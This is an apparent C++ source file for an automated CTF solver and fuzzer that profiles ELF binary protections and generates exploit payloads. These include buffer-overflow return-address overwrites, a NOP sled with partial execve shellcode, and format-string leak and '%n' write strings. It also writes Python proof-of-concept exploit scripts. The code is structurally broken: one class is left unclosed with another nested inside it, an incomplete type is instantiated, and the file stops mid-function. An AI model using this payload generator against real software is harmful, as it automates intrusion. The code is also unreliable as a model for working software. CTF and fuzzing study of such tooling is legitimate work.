#include <iostream>
#include <vector>
#include <string>
#include <random>
#include <fstream>
#include <chrono>
#include <thread>
#include <filesystem>
#include <map>
#include <set>
#include <algorithm>
#include <iomanip>
#include <sstream>
#include <regex>
#include <unistd.h>
#include <sys/wait.h>
#include <sys/resource.h>
#include <sys/stat.h>
#include <signal.h>
#include <cstring>
#include <fcntl.h>
#include <elf.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <poll.h>
#include <fcntl.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <netinet/ip.h>




struct ELFInfo {
    bool is_64bit = false;
    bool has_canary = false;
    bool has_nx = false;
    bool has_pie = false;
    bool has_relro = false;
    bool has_fortify = false;
    std::vector<std::string> dangerous_functions;
    std::vector<std::string> imported_functions;
    std::vector<std::string> exported_functions;
    std::map<std::string, uint64_t> function_addresses;
    std::string architecture;
    uint64_t entry_point = 0;
    std::vector<std::pair<uint64_t, std::string>> sections;
};

struct IOPattern {
    std::string expected_output;
    std::string input_format;
    bool requires_exact_match = false;
    bool is_numeric = false;
    int bit_size = 32;
    bool is_little_endian = true;
    std::string challenge_type = "unknown";
    uint64_t extracted_number = 0;
};

struct CodeCoverage {
    std::set<uint64_t> hit_addresses;
    std::map<std::string, int> function_calls;
    std::map<uint64_t, int> basic_blocks;
    std::vector<std::string> execution_trace;
    int unique_paths = 0;
};

struct VulnResult {
    std::string input;
    std::string vuln_type;
    int exit_code;
    int signal_num;
    std::string description;
    size_t payload_size;
    std::string gdb_output;
    std::string crash_address;
    std::string crashed_function;
    bool exploitable = false;
    std::string exploit_technique;
    CodeCoverage coverage;
    std::vector<std::string> interesting_calls;
    std::string severity = "LOW";
};

struct ExploitStage {
    std::string stage_name;
    std::string payload;
    std::string expected_response;
    std::vector<std::string> success_indicators;
    std::vector<std::string> failure_indicators;
    bool requires_interaction = false;
    int timeout_seconds = 10;
    std::map<std::string, std::string> extracted_data;
};

struct ExploitChain {
    std::string chain_id;
    std::string attack_type;
    std::vector<ExploitStage> stages;
    std::string final_objective;
    bool is_successful = false;
    std::string failure_reason;
    std::vector<std::string> chain_output;
    int current_stage = 0;
    double success_probability = 0.0;
};

struct ChainResult {
    std::string chain_id;
    bool successful;
    std::vector<std::string> stage_outputs;
    std::string final_flag;
    std::string leaked_addresses;
    std::map<std::string, uint64_t> extracted_addresses;
    std::string shell_access;
    int stages_completed = 0;
};


struct SymbolicState {
    std::string state_id;
    std::vector<std::string> constraints;
    std::map<std::string, std::string> symbolic_vars;
    std::string pc_address;
    std::vector<std::string> memory_writes;
    std::vector<std::string> function_calls;
    bool is_satisfiable = true;
    double exploration_priority = 1.0;
};

struct SymbolicResult {
    std::string input_solution;
    std::string target_reached;
    std::vector<std::string> path_constraints;
    std::map<std::string, uint64_t> symbolic_addresses;
    bool found_flag = false;
    bool found_crash = false;
    std::string flag_content;
    std::vector<SymbolicState> interesting_states;
};

struct NetworkTarget {
    std::string host;
    int port;
    std::string protocol; // "tcp", "udp", "raw", "custom"
    bool is_binary_protocol = true;
    int timeout_ms = 5000;
    int max_packet_size = 65535;
    bool connection_oriented = true;
    std::string initial_handshake;
    std::vector<uint8_t> protocol_signature;
};

struct NetworkResponse {
    std::vector<uint8_t> data;
    size_t bytes_received = 0;
    std::chrono::milliseconds response_time{0};
    bool connection_closed = false;
    bool timeout_occurred = false;
    bool connection_reset = false;
    bool invalid_response = false;
    std::string error_message;
    int socket_error = 0;
};

struct NetworkVulnerability {
    std::string vuln_type;
    std::vector<uint8_t> payload;
    NetworkResponse response;
    std::string description;
    std::string severity = "LOW";
    bool causes_crash = false;
    bool causes_hang = false;
    bool causes_memory_corruption = false;
    bool exploitable = false;
    size_t payload_size = 0;
    std::string crash_signature;
};

struct ProtocolState {
    std::string current_state;
    std::vector<std::string> state_history;
    std::map<std::string, std::vector<uint8_t>> session_data;
    int sequence_number = 0;
    bool handshake_complete = false;
    std::vector<uint8_t> last_response;
    int connection_attempts = 0;
};

struct PacketStructure {
    std::vector<std::pair<std::string, size_t>> fields; // field_name, size
    std::map<std::string, std::vector<uint8_t>> field_values;
    size_t total_size = 0;
    bool has_length_field = false;
    size_t length_field_offset = 0;
    bool has_checksum = false;
    size_t checksum_offset = 0;
};

// Network Protocol Fuzzer Class
class NetworkProtocolFuzzer {
private:
    NetworkTarget target;
    std::vector<NetworkVulnerability> vulnerabilities;
    std::vector<std::vector<uint8_t>> mutation_corpus;
    ProtocolState protocol_state;
    PacketStructure discovered_structure;
    std::mt19937 rng;
    bool verbose_mode = false;
    int total_packets_sent = 0;
    int crashes_detected = 0;
    int anomalies_detected = 0;
    
public:
    NetworkProtocolFuzzer(const NetworkTarget& target, bool verbose = false) 
        : target(target), verbose_mode(verbose),
          rng(std::chrono::steady_clock::now().time_since_epoch().count()) {
        std::cout << "[*] Network Protocol Fuzzer initialized for " << target.host 
                  << ":" << target.port << " (" << target.protocol << ")" << std::endl;
    }

class SymbolicExecutionEngine;


class AdvancedCTFSolver {
private:
    std::string target_exe;
    std::mt19937 rng;
    ELFInfo elf_info;
    std::vector<VulnResult> vulnerabilities;
    std::map<std::string, std::vector<std::string>> mutation_corpus;
    std::set<std::string> interesting_inputs;
    int total_runs = 0;
    int crashes_found = 0;
    int unique_crashes = 0;
    bool verbose_mode = false;
    
private:
    std::vector<IOPattern> detected_patterns;
    std::map<std::string, std::string> program_outputs;
    bool auto_solve_mode = true;

private:
    std::vector<ExploitChain> exploit_chains;
    std::map<std::string, std::string> leaked_data;
    bool multi_stage_mode = true;
    int max_chain_stages = 5;




public:
    AdvancedCTFSolver(const std::string& exe_path, bool verbose = false) 
        : target_exe(exe_path), verbose_mode(verbose), 
          rng(std::chrono::steady_clock::now().time_since_epoch().count()) {
        std::cout << "[*] Advanced CTF Solver initialized for: " << target_exe << std::endl;
        analyzeELF();
        setupGDBEnvironment();
    }

    // Comprehensive ELF analysis
    void analyzeELF() {
        std::cout << "[*] Performing comprehensive ELF analysis..." << std::endl;
        
        // Use readelf for detailed analysis
        analyzeWithReadelf();
        analyzeSecurity();
        extractFunctions();
        analyzeImports();
        
        printELFSummary();
    }
    
    void analyzeWithReadelf() {
        // Get ELF header info
        std::string cmd = "readelf -h " + target_exe + " 2>/dev/null";
        std::string output = executeCommand(cmd);
        
        if (output.find("ELF64") != std::string::npos) {
            elf_info.is_64bit = true;
            elf_info.architecture = "x86_64";
        } else {
            elf_info.architecture = "x86";
        }
        
        // Extract entry point
        std::regex entry_regex("Entry point address:\\s+0x([0-9a-fA-F]+)");
        std::smatch match;
        if (std::regex_search(output, match, entry_regex)) {
            elf_info.entry_point = std::stoull(match[1].str(), nullptr, 16);
        }
        
        // Get section information
        cmd = "readelf -S " + target_exe + " 2>/dev/null";
        output = executeCommand(cmd);
        parseSections(output);
    }
    
    void analyzeSecurity() {
        std::cout << "[*] Analyzing binary security features..." << std::endl;
        
        // Check for stack canary
        std::string cmd = "readelf -s " + target_exe + " 2>/dev/null | grep -i canary";
        std::string output = executeCommand(cmd);
        elf_info.has_canary = !output.empty();
        
        // Check for NX bit
        cmd = "readelf -l " + target_exe + " 2>/dev/null | grep -i 'gnu_stack'";
        output = executeCommand(cmd);
        elf_info.has_nx = output.find("RWE") == std::string::npos;
        
        // Check for PIE
        cmd = "readelf -h " + target_exe + " 2>/dev/null | grep -i 'dyn'";
        output = executeCommand(cmd);
        elf_info.has_pie = !output.empty();
        
        // Check for RELRO
        cmd = "readelf -l " + target_exe + " 2>/dev/null | grep -i 'gnu_relro'";
        output = executeCommand(cmd);
        elf_info.has_relro = !output.empty();
        
        // Check for FORTIFY_SOURCE
        cmd = "readelf -s " + target_exe + " 2>/dev/null | grep -i '__.*_chk'";
        output = executeCommand(cmd);
        elf_info.has_fortify = !output.empty();
    }
    
    void extractFunctions() {
        std::cout << "[*] Extracting function symbols..." << std::endl;
        
        // Get function symbols
        std::string cmd = "readelf -s " + target_exe + " 2>/dev/null | grep FUNC";
        std::string output = executeCommand(cmd);
        
        std::istringstream stream(output);
        std::string line;
        while (std::getline(stream, line)) {
            std::regex func_regex("\\s+([0-9a-fA-F]+)\\s+\\d+\\s+FUNC\\s+\\w+\\s+\\w+\\s+\\d+\\s+(\\w+)");
            std::smatch match;
            if (std::regex_search(line, match, func_regex)) {
                uint64_t addr = std::stoull(match[1].str(), nullptr, 16);
                std::string name = match[2].str();
                elf_info.function_addresses[name] = addr;
                elf_info.exported_functions.push_back(name);
            }
        }
        
        // Identify dangerous functions
        std::vector<std::string> dangerous = {
            "gets", "strcpy", "strcat", "sprintf", "vsprintf", "scanf", "fscanf",
            "system", "exec", "popen", "malloc", "free", "realloc", "memcpy",
            "memmove", "strncpy", "strncat", "snprintf", "vsnprintf"
        };
        
        for (const auto& func : dangerous) {
            if (std::find(elf_info.exported_functions.begin(), 
                         elf_info.exported_functions.end(), func) != elf_info.exported_functions.end()) {
                elf_info.dangerous_functions.push_back(func);
            }
        }
    }
    
    void analyzeImports() {
        std::cout << "[*] Analyzing imported functions..." << std::endl;
        
        std::string cmd = "readelf -r " + target_exe + " 2>/dev/null";
        std::string output = executeCommand(cmd);
        
        std::istringstream stream(output);
        std::string line;
        while (std::getline(stream, line)) {
            if (line.find("@") != std::string::npos) {
                size_t pos = line.find_last_of(" ");
                if (pos != std::string::npos) {
                    std::string func = line.substr(pos + 1);
                    if (!func.empty() && func != "0") {
                        elf_info.imported_functions.push_back(func);
                    }
                }
            }
        }
    }
    
    void parseSections(const std::string& output) {
        std::istringstream stream(output);
        std::string line;
        while (std::getline(stream, line)) {
            std::regex section_regex("\\s+\\[\\s*\\d+\\]\\s+(\\S+)\\s+\\S+\\s+([0-9a-fA-F]+)");
            std::smatch match;
            if (std::regex_search(line, match, section_regex)) {
                std::string name = match[1].str();
                uint64_t addr = std::stoull(match[2].str(), nullptr, 16);
                elf_info.sections.push_back({addr, name});
            }
        }
    }
    
    void printELFSummary() {
        std::cout << "\n[*] ===== ELF ANALYSIS SUMMARY =====" << std::endl;
        std::cout << "[+] Architecture: " << elf_info.architecture << std::endl;
        std::cout << "[+] Entry Point: 0x" << std::hex << elf_info.entry_point << std::dec << std::endl;
        std::cout << "[+] Security Features:" << std::endl;
        std::cout << "    Canary: " << (elf_info.has_canary ? "ENABLED" : "DISABLED") << std::endl;
        std::cout << "    NX: " << (elf_info.has_nx ? "ENABLED" : "DISABLED") << std::endl;
        std::cout << "    PIE: " << (elf_info.has_pie ? "ENABLED" : "DISABLED") << std::endl;
        std::cout << "    RELRO: " << (elf_info.has_relro ? "ENABLED" : "DISABLED") << std::endl;
        std::cout << "    FORTIFY: " << (elf_info.has_fortify ? "ENABLED" : "DISABLED") << std::endl;
        
        if (!elf_info.dangerous_functions.empty()) {
            std::cout << "[!] Dangerous functions found:" << std::endl;
            for (const auto& func : elf_info.dangerous_functions) {
                std::cout << "    - " << func;
                if (elf_info.function_addresses.count(func)) {
                    std::cout << " @ 0x" << std::hex << elf_info.function_addresses[func] << std::dec;
                }
                std::cout << std::endl;
            }
        }
        
        std::cout << "[+] Exported functions: " << elf_info.exported_functions.size() << std::endl;
        std::cout << "[+] Imported functions: " << elf_info.imported_functions.size() << std::endl;
    }
    
    void setupGDBEnvironment() {
        std::cout << "[*] Setting up GDB environment for advanced analysis..." << std::endl;
        
        // Create comprehensive GDB init script
        std::ofstream gdb_init(".gdbinit_ctf");
        gdb_init << "set pagination off\n";
        gdb_init << "set print pretty on\n";
        gdb_init << "set disassembly-flavor intel\n";
        gdb_init << "define hook-stop\n";
        gdb_init << "  info registers\n";
        gdb_init << "  x/5i $pc\n";
        gdb_init << "end\n";
        
        // Add function breakpoints for dangerous functions
        for (const auto& func : elf_info.dangerous_functions) {
            gdb_init << "break " << func << "\n";
        }
        
        gdb_init.close();
    }
    
    // AFL++ style intelligent payload generation
    std::vector<std::string> generateIntelligentPayloads() {
        std::vector<std::string> payloads;
        
        std::cout << "[*] Generating intelligent payloads based on ELF analysis..." << std::endl;
        
        // Security-feature aware payloads
        if (!elf_info.has_canary) {
            std::cout << "[+] No stack canary - generating buffer overflow payloads" << std::endl;
            generateBufferOverflowPayloads(payloads);
        }
        
        if (!elf_info.has_nx) {
            std::cout << "[+] No NX bit - generating shellcode payloads" << std::endl;
            generateShellcodePayloads(payloads);
        }
        
        if (elf_info.has_pie) {
            std::cout << "[+] PIE enabled - generating info leak payloads" << std::endl;
            generateInfoLeakPayloads(payloads);
        }
        
        // Function-specific payloads
        for (const auto& func : elf_info.dangerous_functions) {
            generateFunctionSpecificPayloads(func, payloads);
        }
        
        // Format string payloads if printf-family functions detected
        if (hasPrintfFunctions()) {
            std::cout << "[+] Printf functions detected - generating format string payloads" << std::endl;
            generateFormatStringPayloads(payloads);
        }
        
        // Integer overflow payloads for arithmetic functions
        if (hasArithmeticFunctions()) {
            std::cout << "[+] Arithmetic functions detected - generating integer overflow payloads" << std::endl;
            generateIntegerOverflowPayloads(payloads);
        }
        
        // Add mutation-based payloads (AFL++ style)
        generateMutationPayloads(payloads);
        
        std::cout << "[+] Generated " << payloads.size() << " intelligent payloads" << std::endl;
        return payloads;
    }
    
    void generateBufferOverflowPayloads(std::vector<std::string>& payloads) {
        // Calculate likely buffer sizes based on common patterns
        std::vector<int> likely_sizes = {8, 16, 32, 64, 100, 128, 256, 512, 1024};
        
        for (int base_size : likely_sizes) {
            // Classic overflow patterns
            for (int overflow = 1; overflow <= 100; overflow += 4) {
                std::string payload = std::string(base_size + overflow, 'A');
                
                // Add structured overwrite patterns
                if (overflow >= 4) {
                    payload = std::string(base_size, 'A');
                    payload += "BBBB";  // Potential return address
                    if (overflow >= 8) {
                        payload += "CCCC";  // Next frame
                    }
                    if (overflow >= 12) {
                        payload += std::string(overflow - 8, 'D');
                    }
                }
                
                payloads.push_back(payload);
            }
            
            // ROP-style patterns for 64-bit
            if (elf_info.is_64bit) {
                std::string rop_payload = std::string(base_size, 'A');
                rop_payload += "BBBBBBBB";  // 8-byte return address
                rop_payload += "CCCCCCCC";  // Next gadget
                payloads.push_back(rop_payload);
            }
        }
    }
    
    void generateShellcodePayloads(std::vector<std::string>& payloads) {
        // NOP sleds with shellcode placeholders
        std::vector<std::string> shellcodes = {
            std::string(100, '\x90') + "\xCC\xCC\xCC\xCC",  // NOP + breakpoint
            std::string(200, '\x90') + "\x31\xc0\x50\x68\x2f\x2f\x73\x68",  // Partial execve
            std::string(50, '\x90') + "\xeb\xfe",  // NOP + infinite loop
        };
        
        for (const auto& shellcode : shellcodes) {
            for (int padding : {0, 50, 100, 200}) {
                payloads.push_back(std::string(padding, 'A') + shellcode);
            }
        }
    }
    
    void generateInfoLeakPayloads(std::vector<std::string>& payloads) {
        // Payloads designed to leak memory addresses
        std::vector<std::string> leak_patterns = {
            "%p%p%p%p%p%p%p%p",
            "%08x.%08x.%08x.%08x.%08x.%08x",
            "AAAA%7$p.%8$p.%9$p.%10$p",
            std::string(1000, 'A'),  // Large input to potentially leak stack
        };
        
        payloads.insert(payloads.end(), leak_patterns.begin(), leak_patterns.end());
    }
    
    void generateFunctionSpecificPayloads(const std::string& func, std::vector<std::string>& payloads) {
        if (func == "gets" || func == "strcpy") {
            // These functions are especially vulnerable to buffer overflows
            for (int size = 1; size <= 2000; size *= 2) {
                payloads.push_back(std::string(size, 'X'));
            }
        } else if (func == "sprintf" || func == "snprintf") {
            // Format string vulnerabilities
            payloads.push_back("%s%s%s%s%s");
            payloads.push_back("%n%n%n%n%n");
            payloads.push_back("%.1000d%.1000d%.1000d");
        } else if (func == "malloc" || func == "realloc") {
            // Heap-related vulnerabilities
            payloads.push_back("-1");
            payloads.push_back("4294967295");
            payloads.push_back("0");
        }
    }
    
    void generateFormatStringPayloads(std::vector<std::string>& payloads) {
        std::vector<std::string> fmt_payloads = {
            "%s", "%d", "%x", "%n", "%p", "%c", "%u", "%ld", "%lx",
            "%s%s%s%s%s%s%s%s%s%s",
            "%x%x%x%x%x%x%x%x%x%x",
            "%p%p%p%p%p%p%p%p%p%p",
            "AAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x",
            "%.100d%.100d%.100d%.100d%.100d",
            "%1000000000s%1000000000d%1000000000x",
            "%7$n", "%8$n", "%9$n", "%10$n",
            "AAAA%7$p", "BBBB%8$p", "CCCC%9$p",
        };
        
        payloads.insert(payloads.end(), fmt_payloads.begin(), fmt_payloads.end());
    }
    
    void generateIntegerOverflowPayloads(std::vector<std::string>& payloads) {
        std::vector<std::string> int_payloads = {
            "0", "-1", "1", "2", "2147483647", "2147483648", "-2147483648", "-2147483649",
            "4294967295", "4294967296", "9223372036854775807", "9223372036854775808",
            "-9223372036854775808", "18446744073709551615", "18446744073709551616"
        };
        
        payloads.insert(payloads.end(), int_payloads.begin(), int_payloads.end());
    }
    
    void generateMutationPayloads(std::vector<std::string>& payloads) {
        // AFL++ style mutations
        std::string base_input = "Hello World";
        
        for (int i = 0; i < 100; i++) {
            std::string mutated = base_input;
            
            // Bit flip mutations
            if (!mutated.empty()) {
                int pos = rng() % mutated.size();
                int bit = rng() % 8;
                mutated[pos] ^= (1 << bit);
            }
            
            // Byte insertion
            if (rng() % 2) {
                int pos = rng() % (mutated.size() + 1);
                mutated.insert(pos, 1, static_cast<char>(rng() % 256));
            }
            
            // Byte deletion
            if (!mutated.empty() && rng() % 2) {
                int pos = rng() % mutated.size();
                mutated.erase(pos, 1);
            }
            
            // Dictionary splicing (interesting strings)
            std::vector<std::string> dictionary = {
                "/bin/sh", "admin", "root", "flag", "password", "system", "exec"
            };
            
            if (rng() % 3 == 0) {
                std::string dict_word = dictionary[rng() % dictionary.size()];
                int pos = rng() % (mutated.size() + 1);
                mutated.insert(pos, dict_word);
            }
            
            payloads.push_back(mutated);
        }
    }
    
    bool hasPrintfFunctions() {
        std::vector<std::string> printf_funcs = {"printf", "sprintf", "snprintf", "fprintf", "vprintf"};
        for (const auto& func : printf_funcs) {
            if (std::find(elf_info.imported_functions.begin(), elf_info.imported_functions.end(), func) != elf_info.imported_functions.end()) {
                return true;
            }
        }
        return false;
    }
    
    bool hasArithmeticFunctions() {
        std::vector<std::string> arith_funcs = {"atoi", "atol", "strtol", "strtoul", "malloc", "calloc"};
        for (const auto& func : arith_funcs) {
            if (std::find(elf_info.imported_functions.begin(), elf_info.imported_functions.end(), func) != elf_info.imported_functions.end()) {
                return true;
            }
        }
        return false;
    }
    
    // Enhanced execution with GDB tracing
    bool executeWithAdvancedGDB(const std::string& payload, VulnResult& result) {
        std::string input_file = "gdb_input_" + std::to_string(total_runs) + ".bin";
        std::string gdb_script = "gdb_script_" + std::to_string(total_runs) + ".gdb";
        std::string gdb_output = "gdb_output_" + std::to_string(total_runs) + ".txt";
        
        // Write payload
        std::ofstream inp_file(input_file, std::ios::binary);
        inp_file.write(payload.c_str(), payload.size());
        inp_file.close();
        
        // Create advanced GDB script with function tracing
        std::ofstream gdb_file(gdb_script);
        gdb_file << "set pagination off\n";
        gdb_file << "set logging file " << gdb_output << "\n";
        gdb_file << "set logging on\n";
        gdb_file << "set confirm off\n";
        
        // Set breakpoints on dangerous functions
        for (const auto& func : elf_info.dangerous_functions) {
            gdb_file << "break " << func << "\n";
            gdb_file << "commands\n";
            gdb_file << "  printf \"*** CALLED: " << func << " ***\\n\"\n";
            gdb_file << "  info args\n";
            gdb_file << "  continue\n";
            gdb_file << "end\n";
        }
        
        // Set breakpoint on main entry
        gdb_file << "break main\n";
        gdb_file << "commands\n";
        gdb_file << "  printf \"*** ENTERED MAIN ***\\n\"\n";
        gdb_file << "  continue\n";
        gdb_file << "end\n";
        
        gdb_file << "run < " << input_file << "\n";
        gdb_file << "printf \"*** CRASH ANALYSIS ***\\n\"\n";
        gdb_file << "info registers\n";
        gdb_file << "bt full\n";
        gdb_file << "info frame\n";
        gdb_file << "x/20wx $sp\n";
        gdb_file << "disas $pc-32,$pc+32\n";
        gdb_file << "info proc mappings\n";
        
        // Try to identify the crashed function
        gdb_file << "printf \"*** FUNCTION ANALYSIS ***\\n\"\n";
        gdb_file << "info symbol $pc\n";
        gdb_file << "quit\n";
        gdb_file.close();
        
        // Execute GDB
        std::string gdb_cmd = "timeout 15 gdb -batch -x " + gdb_script + " " + target_exe + " 2>&1";
        std::string output = executeCommand(gdb_cmd);
        
        // Read output
        std::ifstream gdb_out(gdb_output);
        if (gdb_out.is_open()) {
            std::stringstream buffer;
            buffer << gdb_out.rdbuf();
            result.gdb_output = buffer.str();
            gdb_out.close();
        }
        
        // Parse advanced GDB output
        parseAdvancedGDBOutput(result);
        
        // Cleanup
        std::filesystem::remove(input_file);
        std::filesystem::remove(gdb_script);
        std::filesystem::remove(gdb_output);
        
        return !result.gdb_output.empty();
    }
    
    void parseAdvancedGDBOutput(VulnResult& result) {
        std::istringstream stream(result.gdb_output);
        std::string line;
        
        while (std::getline(stream, line)) {
            // Track function calls
            if (line.find("*** CALLED:") != std::string::npos) {
                size_t start = line.find("CALLED: ") + 8;
                size_t end = line.find(" ***", start);
                if (end != std::string::npos) {
                    std::string func = line.substr(start, end - start);
                    result.interesting_calls.push_back(func);
                    result.coverage.function_calls[func]++;
                }
            }
            
            // Identify crashed function
            if (line.find("info symbol") != std::string::npos) {
                std::getline(stream, line);  // Get next line with symbol info
                if (!line.empty() && line.find("No symbol") == std::string::npos) {
                    result.crashed_function = line;
                }
            }
            
            // Enhanced exploitability analysis
            if (line.find("rip") != std::string::npos || line.find("eip") != std::string::npos) {
                if (line.find("0x41414141") != std::string::npos) {
                    result.exploitable = true;
                    result.exploit_technique = "Direct EIP/RIP control (classic buffer overflow)";
                    result.severity = "CRITICAL";
                } else if (line.find("0x42424242") != std::string::npos) {
                    result.exploitable = true;
                    result.exploit_technique = "Structured buffer overflow - return address control";
                    result.severity = "HIGH";
                }
            }
            
            // Check for format string indicators
            if (line.find("printf") != std::string::npos && result.input.find("%") != std::string::npos) {
                result.exploitable = true;
                result.exploit_technique = "Format string vulnerability";
                result.severity = "HIGH";
            }
        }
        
        // Analyze function call patterns
        if (!result.interesting_calls.empty()) {
            result.description += " | Functions called: ";
            for (const auto& call : result.interesting_calls) {
                result.description += call + " ";
            }
        }
    }
    
    // Complete the incomplete executeWithPayload function
    bool executeWithPayload(const std::string& payload, VulnResult& result) {
        total_runs++;
        result.input = payload;
        result.payload_size = payload.size();
        
        // First run with GDB for detailed analysis
        executeWithAdvancedGDB(payload, result);
        
        // Then run normally for basic crash detection
        int pipefd[2];
        if (pipe(pipefd) == -1) return false;
        
        pid_t pid = fork();
        if (pid == 0) {
            // Child process
            close(pipefd[1]);
            dup2(pipefd[0], STDIN_FILENO);
            close(pipefd[0]);
            
            // Set resource limits
            struct rlimit rl;
            rl.rlim_cur = rl.rlim_max = 5;  // 5 second timeout
            setrlimit(RLIMIT_CPU, &rl);
            
            rl.rlim_cur = rl.rlim_max = 50 * 1024 * 1024;  // 50MB memory limit
            setrlimit(RLIMIT_AS, &rl);
            
            execl(target_exe.c_str(), target_exe.c_str(), nullptr);
            _exit(1);
        } else if (pid > 0) {
            // Parent process
            close(pipefd[0]);
            
            // Write payload to child
            write(pipefd[1], payload.c_str(), payload.size());
            close(pipefd[1]);
            
            int status;
            int wait_result = waitpid(pid, &status, 0);
            
            if (wait_result == pid) {
                if (WIFEXITED(status)) {
                    result.exit_code = WEXITSTATUS(status);
                    return false; // Normal exit, no vulnerability
                } else if (WIFSIGNALED(status)) {
                    result.signal_num = WTERMSIG(status);
                    crashes_found++;
                    
                    // Classify crash type
                    switch (result.signal_num) {
                        case SIGSEGV:
                            result.vuln_type = "Segmentation Fault";
                            result.description = "Memory access violation detected";
                            break;
                        case SIGABRT:
                            result.vuln_type = "Abort Signal";
                            result.description = "Program aborted (possible stack smashing detected)";
                            break;
                        case SIGFPE:
                            result.vuln_type = "Floating Point Exception";
                            result.description = "Division by zero or arithmetic error";
                            break;
                        case SIGILL:
                            result.vuln_type = "Illegal Instruction";
                            result.description = "Invalid instruction execution (possible code corruption)";
                            break;
                        default:
                            result.vuln_type = "Unknown Signal";
                            result.description = "Process terminated by signal " + std::to_string(result.signal_num);
                    }
                    
                    if (isUniqueCrash(result)) {
                        unique_crashes++;
                    }
                    
                    return true; // Crash detected
                }
            }
        }
        
        return false;
    }
    
    // Utility function to execute shell commands
    std::string executeCommand(const std::string& cmd) {
        char buffer[128];
        std::string result = "";
        FILE* pipe = popen(cmd.c_str(), "r");
        if (!pipe) return result;
        
        while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
            result += buffer;
        }
        pclose(pipe);
        return result;
    }
    
    // Check if crash is unique based on crash signature
    bool isUniqueCrash(const VulnResult& result) {
        std::string signature = result.vuln_type + "_" + std::to_string(result.signal_num) + "_" + result.crashed_function;
        return interesting_inputs.insert(signature).second;
    }
    
    // Count exploitable vulnerabilities
    int countExploitable() {
        int count = 0;
        for (const auto& vuln : vulnerabilities) {
            if (vuln.exploitable) count++;
        }
        return count;
    }
    
private:
    SymbolicExecutionEngine* symbolic_engine = nullptr;
    std::vector<SymbolicResult> symbolic_results;

public:
    // Add this to your constructor
    void initializeSymbolicExecution() {
        symbolic_engine = new SymbolicExecutionEngine(target_exe);
    }
    
    // Add this method
    void performSymbolicAnalysis() {
        if (!symbolic_engine) {
            initializeSymbolicExecution();
        }
        
        std::cout << "[*] ===== SYMBOLIC EXECUTION ANALYSIS =====" << std::endl;
        
        // Try to find flag automatically
        SymbolicResult flag_result;
        symbolic_engine->findFlagStrings(flag_result);
        
        if (flag_result.found_flag) {
            std::cout << "[!] SYMBOLIC EXECUTION SUCCESS!" << std::endl;
            std::cout << "[+] Found flag: " << flag_result.flag_content << std::endl;
            std::cout << "[+] Winning input: " << flag_result.input_solution << std::endl;
            
            // Save solution
            saveSolution(flag_result.input_solution, flag_result.flag_content);
            generateSolutionScript(flag_result.input_solution);
            return;
        }
        
        // If no flag found, look for vulnerabilities
        SymbolicResult vuln_result;
        symbolic_engine->findVulnerabilityPaths(vuln_result);
        
        if (vuln_result.found_crash) {
            std::cout << "[+] Found vulnerability paths via symbolic execution" << std::endl;
        }
        
        // Store results
        symbolic_results.push_back(flag_result);
        symbolic_results.push_back(vuln_result);
    }

    // Save vulnerability details
    void saveAdvancedVulnerability(const VulnResult& result, int test_num) {
        std::string filename = "vuln_" + std::to_string(test_num) + "_" + result.vuln_type + ".txt";
        std::ofstream file(filename);
        
        file << "=== VULNERABILITY REPORT ===" << std::endl;
        file << "Test Number: " << test_num << std::endl;
        file << "Vulnerability Type: " << result.vuln_type << std::endl;
        file << "Severity: " << result.severity << std::endl;
        file << "Exploitable: " << (result.exploitable ? "YES" : "NO") << std::endl;
        file << "Exploit Technique: " << result.exploit_technique << std::endl;
        file << "Signal: " << result.signal_num << std::endl;
        file << "Exit Code: " << result.exit_code << std::endl;
        file << "Payload Size: " << result.payload_size << std::endl;
        file << "Description: " << result.description << std::endl;
        file << "Crashed Function: " << result.crashed_function << std::endl;
        
        file << "\n=== PAYLOAD ===" << std::endl;
        file << "Raw payload (hex): ";
        for (unsigned char c : result.input) {
            file << std::hex << std::setw(2) << std::setfill('0') << (int)c << " ";
        }
        file << std::endl;
        
        file << "ASCII payload: ";
        for (char c : result.input) {
            if (std::isprint(c)) {
                file << c;
            } else {
                file << "\\x" << std::hex << std::setw(2) << std::setfill('0') << (int)(unsigned char)c;
            }
        }
        file << std::endl;
        
        if (!result.interesting_calls.empty()) {
            file << "\n=== FUNCTION CALLS ===" << std::endl;
            for (const auto& call : result.interesting_calls) {
                file << "- " << call << std::endl;
            }
        }
        
        file << "\n=== GDB OUTPUT ===" << std::endl;
        file << result.gdb_output << std::endl;
        
        file.close();
        
        if (verbose_mode) {
            std::cout << "[!] Saved vulnerability report: " << filename << std::endl;
        }
    }
    
    // Generate proof-of-concept exploit
    void generateAdvancedPoC(const VulnResult& result, int test_num) {
        std::string poc_filename = "poc_" + std::to_string(test_num) + ".py";
        std::ofstream poc_file(poc_filename);
        
        poc_file << "#!/usr/bin/env python3" << std::endl;
        poc_file << "# Proof of Concept for " << result.vuln_type << std::endl;
        poc_file << "# Generated by Advanced CTF Solver" << std::endl;
        poc_file << "# Severity: " << result.severity << std::endl;
        poc_file << "# Technique: " << result.exploit_technique << std::endl;
        poc_file << std::endl;
        
        poc_file << "import subprocess" << std::endl;
        poc_file << "import sys" << std::endl;
        poc_file << std::endl;
        
        poc_file << "def exploit():" << std::endl;
        poc_file << "    target = '" << target_exe << "'" << std::endl;
        poc_file << "    " << std::endl;
        
        // Generate payload based on vulnerability type
        if (result.exploit_technique.find("buffer overflow") != std::string::npos) {
            poc_file << "    # Buffer overflow payload" << std::endl;
            poc_file << "    payload = b'";
            for (unsigned char c : result.input) {
                poc_file << "\\x" << std::hex << std::setw(2) << std::setfill('0') << (int)c;
            }
            poc_file << "'" << std::endl;
        } else if (result.exploit_technique.find("format string") != std::string::npos) {
            poc_file << "    # Format string payload" << std::endl;
            poc_file << "    payload = b'" << result.input << "'" << std::endl;
        } else {
            poc_file << "    # Generic payload" << std::endl;
            poc_file << "    payload = b'";
            for (unsigned char c : result.input) {
                if (std::isprint(c) && c != '\\' && c != '\'') {
                    poc_file << c;
                } else {
                    poc_file << "\\x" << std::hex << std::setw(2) << std::setfill('0') << (int)c;
                }
            }
            poc_file << "'" << std::endl;
        }
        
        poc_file << std::endl;
        poc_file << "    print(f'[*] Exploiting {target} with payload of length {len(payload)}')" << std::endl;
        poc_file << "    print(f'[*] Vulnerability: " << result.vuln_type << "')" << std::endl;
        poc_file << "    print(f'[*] Expected signal: " << result.signal_num << "')" << std::endl;
        poc_file << "    " << std::endl;
        poc_file << "    try:" << std::endl;
